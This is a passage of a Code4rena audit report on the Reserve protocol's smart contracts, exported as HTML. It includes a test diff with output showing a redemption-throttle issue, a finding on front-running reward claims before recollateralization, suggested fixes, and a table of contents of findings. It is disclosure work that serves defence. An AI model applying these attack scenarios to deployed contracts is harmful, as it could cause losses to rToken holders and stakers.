console.log(&quot;after&quot;, {redemptionAvailable, issuanceAvailable});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         it(&#39;Should update issuance throttle correctly on redemption&#39;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           const rechargePerBlock = config.issuanceThrottle.amtRate.div(BLOCKS_PER_HOUR)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -1335,6 +1360,7 @@ describe(`RTokenP${IMPLEMENTATION} contract`, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   describe(&#39;Melt/Mint #fast&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     const issueAmount: BigNumber = bn(&#39;100e18&#39;)</span></span></span></code></pre>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"128\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  redemptionAvailable: BigNumber { value: &quot;10000000000000000000&quot; }, // 1e20</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  issuanceAvailable: BigNumber { value: &quot;1000000000000000000000000&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  totalSupply: BigNumber { value: &quot;100000000000000000000&quot; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">after {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  redemptionAvailable: BigNumber { value: &quot;10000000000000&quot; }, // 1e14</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  issuanceAvailable: BigNumber { value: &quot;1000000000000000000000000&quot; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Mitigating this issue seems a bit tricky.</p>\n<p>One way is at the end of <code>currentlyAvailable()</code> to return the max of <code>available</code> and <code>throttle.lastAvailable</code> (up to some limit, in order not to allow to much of it to accumulate).</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/79#issuecomment-1435362326\">HollaDieWaldfee (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Seems valid but I have a doubt about this:</p>\n<p>rToken issuance uses rounding mode CEIL when calculating how much a user has to pay.<br>\nrToken redemption uses rounding mode FLOOR when calculating how much a user receives.</p>\n<p>So I think there is a bit more cost involved than just gas and the attack needs to be renewed very often.</p>\n<p>Also:\nMight this be mitigated when the redemption limit is chosen significantly higher than the issuance limit?<br>\nBecause then when the attack must be renewed and <code>issue</code> is called, the redemption limit will be raised and not so much that it hits its limit.<br>\nSo the result on redemption limit after redemption is then 0.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/79#issuecomment-1435444036\">tbrent (Reserve) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/79#issuecomment-1435444258\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>@HollaDieWaldfee - that’s a really nice mitigation! I think that’s exactly the thing to do.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/79#issuecomment-1435444258\">tbrent (Reserve) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/reserve-protocol/protocol/pull/656\">reserve-protocol/protocol#656</a></p>\n</blockquote>\n<hr>\n<h2 id=\"attacker-can-cause-loss-to-rtoken-holders-and-stakers-by-running-backingmanager_managetokens-before-rewards-are-claimed\" style=\"position:relative;\"><a href=\"#attacker-can-cause-loss-to-rtoken-holders-and-stakers-by-running-backingmanager_managetokens-before-rewards-are-claimed\" aria-label=\"attacker can cause loss to rtoken holders and stakers by running backingmanager_managetokens before rewards are claimed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/22\">Attacker can cause loss to rToken holders and stakers by running <code>BackingManager._manageTokens</code> before rewards are claimed</a></h2>\n<p><em>Submitted by HollaDieWaldfee</em></p>\n<p><strong>Severity: Medium</strong></p>\n<h3 id=\"lines-of-code-6\" style=\"position:relative;\"><a href=\"#lines-of-code-6\" aria-label=\"lines of code 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/BackingManager.sol#L105-L153\">https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/BackingManager.sol#L105-L153</a></p>\n<h3 id=\"impact-11\" style=\"position:relative;\"><a href=\"#impact-11\" aria-label=\"impact 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The assets that back the rTokens are held by the <code>BackingManager</code> and can earn rewards.  </p>\n<p>The rewards can be claimed via the <a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/mixins/Trading.sol#L82-L84\"><code>TradingP1.claimRewards</code></a> and <a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/mixins/Trading.sol#L90-L92\"><code>TradingP1.claimRewardsSingle</code></a> function.  </p>\n<p>The <code>BackingManager</code> inherits from <code>TradingP1</code> and therefore the above functions can be used to claim rewards.  </p>\n<p>The issue is that the <code>BackingManager</code> does not claim rewards as part of its <a href=\"https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/BackingManager.sol#L105-L153\"><code>_manageTokens</code></a> function.  </p>\n<p>So recollateralization can occur before rewards have been claimed.  </p>\n<p>There exist possibilities how an attacker can exploit this to cause a loss to rToken holders and rsr stakers.  </p>\n<h3 id=\"proof-of-concept-30\" style=\"position:relative;\"><a href=\"#proof-of-concept-30\" aria-label=\"proof of concept 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Let’s think about an example for such a scenario:  </p>\n<p>Assume that the <code>RToken</code> is backed by a considerable amount of <code>TokenA</code></p>\n<p><code>TokenA</code> earns rewards but not continuously. Bigger amounts of rewards are paid out periodically. Say 5% rewards every year.  </p>\n<p>Assume further that the <code>RToken</code> is currently undercollateralized.  </p>\n<p>The attacker can now front-run the claiming of rewards and perform recollateralization.  </p>\n<p>The recollateralization might now seize <code>rsr</code> from stakers or take an unnecessary haircut.  </p>\n<h3 id=\"tools-used-16\" style=\"position:relative;\"><a href=\"#tools-used-16\" aria-label=\"tools used 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>I suggest that the <code>BackingManager._manageTokens</code> function calls <code>claimRewards</code>. Even before it calculates how many baskets it holds:  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"129\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/p1/BackingManager.sol b/contracts/p1/BackingManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index fc38ce29..e17bb63d 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/p1/BackingManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/p1/BackingManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -113,6 +113,8 @@ contract BackingManagerP1 is TradingP1, IBackingManager {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint48 basketTimestamp = basketHandler.timestamp();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (block.timestamp &lt; basketTimestamp + tradingDelay) return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        this.claimRewards();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint192 basketsHeld = basketHandler.basketsHeldBy(address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // if (basketHandler.fullyCollateralized())</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/22#issuecomment-1435352092\">tbrent (Reserve) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p><code>claimRewards()</code> can be pretty gas-intensive, so we’ll have to see whether we decide this is worth doing or not. But nice find!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/22#issuecomment-1445186383\">0xA5DF (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p><code>claimRewards()</code> can be pretty gas-intensive, so we’ll have to see whether we decide this is worth doing or not. But nice find!</p>\n</blockquote>\n<p>Maybe instead you can require <code>claimRewards()</code> to be called within some time interval - mark the last time it was called using a storage variable and in <code>_manageTokens()</code> revert if more than that time interval has passed.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-2\">High Risk Findings (2)</a></p>\n<ul>\n<li><a href=\"#h-01-adversary-can-abuse-a-quirk-of-compound-redemption-to-manipulate-the-underlying-exchange-rate-and-maliciously-disable-ctoken-collaterals\">[H-01] Adversary can abuse a quirk of compound redemption to manipulate the underlying exchange rate and maliciously disable cToken collaterals</a></li>\n<li><a href=\"#h-02-basket-range-formula-is-inefficient-leading-the-protocol-to-unnecessary-haircut\">[H-02] Basket range formula is inefficient, leading the protocol to unnecessary haircut</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-25\">Medium Risk Findings (25)</a></p>\n<ul>\n<li><a href=\"#m-01-battery-discharge-mechanism-doesnt-work-correctly-for-first-redemption\">[M-01] Battery discharge mechanism doesn’t work correctly for first redemption</a></li>\n<li><a href=\"#m-02-attacker-can-make-stakerate-to-be-1-in-the-strsr-contract-and-users-depositing-tokens-can-lose-funds-because-of-the-big-rounding-error\">[M-02] Attacker can make stakeRate to be 1 in the StRSR contract and users depositing tokens can lose funds because of the big rounding error</a></li>\n<li><a href=\"#m-03-baited-by-redemption-during-undercollateralization-no-issuance-just-transfer\">[M-03] Baited by redemption during undercollateralization (no issuance, just transfer)</a></li>\n<li><a href=\"#m-04-redemptions-during-undercollateralization-can-be-hot-swapped-to-steal-all-funds\">[M-04] Redemptions during undercollateralization can be hot-swapped to steal all funds</a></li>\n<li><a href=\"#m-05-early-user-can-call-issue-and-then-melt-to-increase-basketsneeded-to-supply-ratio-to-its-maximum-value-and-then-melt-wont-work-and-contract-features-like-issue-wont-work\">[M-05] Early user can call <code>issue()</code> and then <code>melt()</code> to increase <code>basketsNeeded</code> to supply ratio to its maximum value and then <code>melt()</code> won’t work and contract features like <code>issue()</code> won’t work</a></li>\n<li><a href=\"#m-06-too-few-rewards-paid-over-periods-in-furnace-and-strsr\">[M-06] Too few rewards paid over periods in Furnace and StRSR</a></li>\n<li><a href=\"#m-07-attacker-can-steal-rtoken-holders-funds-by-performing-reentrancy-attack-during-redeem-function-token-transfers\">[M-07] Attacker can steal RToken holders’ funds by performing reentrancy attack during <code>redeem()</code> function token transfers</a></li>\n<li><a href=\"#m-08-assetlotprice-doesnt-use-the-most-recent-price-in-case-of-oracle-timeout\">[M-08] <code>Asset.lotPrice()</code> doesn’t use the most recent price in case of oracle timeout</a></li>\n<li><a href=\"#m-09-withdrawals-will-stuck\">[M-09] Withdrawals will stuck</a></li>\n<li><a href=\"#m-10-unsafe-downcasting-in-issue-can-be-exploited-to-cause-permanent-dos\">[M-10] Unsafe downcasting in <code>issue(...)</code> can be exploited to cause permanent DoS</a></li>\n<li><a href=\"#m-11-should-accrue-before-change-loss-of-rewards-in-case-of-change-of-settings\">[M-11] Should Accrue Before Change, Loss of Rewards in case of change of settings</a></li>\n<li><a href=\"#m-12-backingmanager-rsr-is-distributed-across-all-rsr-revenue-destinations-which-is-a-loss-for-rsr-stakers\">[M-12] BackingManager: rsr is distributed across all rsr revenue destinations which is a loss for rsr stakers</a></li>\n<li><a href=\"#m-13-attacker-can-prevent-vesting-for-a-very-long-time\">[M-13] Attacker can prevent vesting for a very long time</a></li>\n<li><a href=\"#m-14-unsafe-cast-of-uint8-datatype-to-int8\">[M-14] Unsafe cast of <code>uint8</code> datatype to <code>int8</code></a></li>\n<li><a href=\"#m-15-the-furnacemelt-is-vulnerable-to-sandwich-attacks\">[M-15] The <code>Furnace#melt()</code> is vulnerable to sandwich attacks</a></li>\n<li><a href=\"#m-16-rtoken-permanently-insolventunusable-if-a-single-collateral-in-the-basket-behaves-unexpectedly\">[M-16] RToken permanently insolvent/unusable if a single collateral in the basket behaves unexpectedly</a></li>\n<li><a href=\"#m-17-refresh-will-revert-on-oracle-deprecation-effectively-disabling-part-of-the-protocol\">[M-17] <code>refresh()</code> will revert on Oracle deprecation, effectively disabling part of the protocol</a></li>\n<li><a href=\"#m-18-if-name-is-changed-then-the-domain-separator-would-be-wrong\">[M-18] If name is changed then the domain separator would be wrong</a></li>\n<li><a href=\"#m-19-in-case-that-unstakingdelay-is-decreased-users-who-have-previously-unstaked-would-have-to-wait-more-than-unstakingdelay-for-new-unstakes\">[M-19] In case that <code>unstakingDelay</code> is decreased, users who have previously unstaked would have to wait more than <code>unstakingDelay</code> for new unstakes</a></li>\n<li><a href=\"#m-20-shortfall-might-be-calculated-incorrectly-if-a-price-value-for-one-collateral-isnt-fetched-correctly\">[M-20] Shortfall might be calculated incorrectly if a price value for one collateral isn’t fetched correctly</a></li>\n<li><a href=\"#m-21-loss-of-staking-yield-for-stakers-when-another-user-stakes-in-pausefrozen-state\">[M-21] Loss of staking yield for stakers when another user stakes in pause/frozen state</a></li>\n<li><a href=\"#m-22-recollateralizationlib-dust-loss-for-an-asset-should-be-capped-at-its-low-value\">[M-22] RecollateralizationLib: Dust loss for an asset should be capped at it’s low value</a></li>\n<li><a href=\"#m-23-strsr-seizersr-function-fails-to-update-rsrrewardsatlastpayout-variable\">[M-23] StRSR: seizeRSR function fails to update rsrRewardsAtLastPayout variable</a></li>\n<li><a href=\"#m-24-baskethandler-users-might-not-be-able-to-redeem-their-rtoken-when-protocol-is-paused-due-to-refreshbasket-function\">[M-24] BasketHandler: Users might not be able to redeem their rToken when protocol is paused due to refreshBasket function</a></li>\n<li><a href=\"#m-25-backingmanager-rtokens-might-not-be-redeemable-when-protocol-is-paused-due-to-missing-token-allowance\">[M-25] BackingManager: rTokens might not be redeemable when protocol is paused due to missing token allowance</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#issues-overview\">Issues Overview</a></li>\n<li><a href=\"#l-01-melt-function-should-be-only-callable-by-the-furnance-contract\">L-01 Melt function should be only callable by the Furnance contract</a></li>\n<li><a href=\"#l-02-stake-function-shouldnt-be-accessible-when-the-status-is-paused-or-frozen\">L-02 Stake function shouldn’t be accessible, when the status is paused or frozen</a></li>\n<li><a href=\"#n-01-create-your-own-import-names-instead-of-using-the-regular-ones\">N-01 Create your own import names instead of using the regular ones</a></li>\n<li><a href=\"#n-02-max-value-cant-be-applied-in-the-setters\">N-02 Max value can’t be applied in the setters</a></li>\n<li><a href=\"#n-03-using-while-for-unbounded-loops-isnt-recommended\">N-03 Using while for unbounded loops isn’t recommended</a></li>\n<li><a href=\"#n-04-inconsistent-visibility-on-the-bool-disabled\">N-04 Inconsistent visibility on the bool “disabled”</a></li>\n<li><a href=\"#n-05-modifier-exists-but-not-used-when-needed\">N-05 Modifier exists, but not used when needed</a></li>\n<li><a href=\"#n-06-unused-constructor\">N-06 Unused constructor</a></li>\n<li><a href=\"#n-07-unnecessary-check-in-both-the-_mint-and-_burn-function\">N-07 Unnecessary check in both the _mint and _burn function</a></li>\n<li><a href=\"#r-01-numeric-values-having-to-do-with-time-should-use-time-units-for-readability\">R-01 Numeric values having to do with time should use time units for readability</a></li>\n<li><a href=\"#r-02-use-require-instead-of-assert\">R-02 Use require instead of assert</a></li>\n<li><a href=\"#r-03-unnecessary-overflow-check-can-be-rafactored-in-a-better-way\">R-03 Unnecessary overflow check can be rafactored in a better way</a></li>\n<li><a href=\"#r-04-if-statement-should-check-first-if-the-status-is-disabled\">R-04 If statement should check first, if the status is disabled</a></li>\n<li><a href=\"#r-05-some-number-values-can-be-refactored-with-_\">R-05 Some number values can be refactored with <code>_</code></a></li>\n<li><a href=\"#r-06-revert-should-be-used-on-some-functions-instead-of-return\">R-06 Revert should be used on some functions instead of return</a></li>\n<li><a href=\"#r-07-modifier-can-be-applied-on-the-function-instead-of-creating-require-statement\">R-07 Modifier can be applied on the function instead of creating require statement</a></li>\n<li><a href=\"#r-08-shorthand-way-to-write-if--else-statement\">R-08 Shorthand way to write if / else statement</a></li>\n<li><a href=\"#r-09-function-should-be-deleted-if-a-modifier-already-exists-doing-its-job\">R-09 Function should be deleted, if a modifier already exists doing its job</a></li>\n<li><a href=\"#r-10-the-right-value-should-be-used-instead-of-downcasting-from-uint256-to-uint192\">R-10 The right value should be used instead of downcasting from uint256 to uint192</a></li>\n<li><a href=\"#o-01-code-contains-empty-blocks\">O-01 Code contains empty blocks</a></li>\n<li><a 